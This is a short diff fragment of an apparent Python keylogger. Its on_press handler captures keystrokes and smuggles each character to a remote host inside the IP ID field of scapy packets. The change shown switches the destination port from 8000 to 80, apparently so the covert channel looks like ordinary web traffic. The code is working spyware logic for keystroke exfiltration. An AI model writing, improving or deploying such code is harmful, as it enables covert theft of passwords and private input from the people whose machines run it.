@@ -19,7 +19,7 @@ def on_press(key):
             char = "\n"
         else:
             char = key.char # Char was something else.
-        packet = IP(dst=args.destination_host, id=ord(char)*255)/TCP(sport=randint(10000, 65534), dport=8000)
+        packet = IP(dst=args.destination_host, id=ord(char)*255)/TCP(sport=randint(10000, 65534), dport=80)
         send(packet)
     except AttributeError:
         pass
